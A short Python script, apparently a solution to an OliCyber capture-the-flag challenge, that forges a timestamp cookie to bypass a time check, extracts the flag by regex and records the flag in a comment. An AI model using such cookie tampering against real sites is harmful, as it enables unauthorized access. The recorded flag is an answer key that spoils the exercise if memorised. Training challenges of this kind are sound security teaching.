import requests
import re

site = "https://pazienza.challs.olicyber.it/"
r = requests.get(site, cookies = {"Get-Flag-Time" : "1755851376"}).text #Calcolare il timestamp unix con data corrente
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)


#flag{n3v3r_7ru57_c00k13s_d8af1903}